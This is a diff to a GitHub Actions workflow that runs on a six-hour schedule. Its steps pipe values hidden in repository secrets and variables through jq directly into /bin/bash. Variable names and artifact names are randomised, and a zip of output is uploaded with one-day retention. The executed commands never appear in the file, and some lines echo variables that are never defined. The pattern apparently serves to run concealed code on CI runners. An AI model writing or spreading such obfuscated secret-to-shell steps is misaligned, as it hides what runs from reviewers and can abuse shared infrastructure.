@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '9 1,7,13,19 * * *'
+    - cron: '34 3,9,15,21 * * *'
 jobs:
   start:
     runs-on: ubuntu-latest
@@ -11,19 +11,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: Execute task
         env:
-          ngu49: ${{ secrets.ngu49 }}
+          vz1: ${{ secrets.vz1 }}
         run: |
-          printf '%s' "$ngu49" | jq -r .eq2679 | /bin/bash
-          printf '%s' "$nys1604" | jq -r .ksgn70326 | /bin/bash
-          echo $zow8 | jq -r .iuyow6 | /bin/bash
-          printf '%s' "$uxva07776" | jq -r .adopp15839 | /bin/bash
-          printf '%s' "$xuze66" | jq -r .aozfr0 | /bin/bash
-          echo $qs51974 | jq -r .biamu2441 | /bin/bash
+          printf '%s' "$vz1" | jq -r .mhsan2 | /bin/bash
+          echo $si0 | jq -r .z5331 | /bin/bash
+          echo $xiy93 | jq -r .r92944 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
         uses: actions/upload-artifact@v4
         with:
-          name: vIzKCZty
+          name: NPQWAAnH
           path: "*.zip"
           retention-days: 1
